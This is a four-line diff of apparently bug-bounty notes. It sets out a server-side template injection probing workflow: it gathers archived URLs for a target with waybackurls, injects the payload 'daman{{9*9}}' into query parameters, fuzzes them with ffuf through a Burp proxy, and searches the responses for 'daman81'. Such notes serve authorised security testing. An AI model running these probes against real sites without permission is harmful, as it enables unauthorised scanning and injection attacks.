@@ -1,0 +1,4 @@
+~waybackurls http://target.com | qsreplace "daman{{9*9}}" > fuzz.txt
+~ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
+(captured requests in burp)
+searched: daman81 in burp
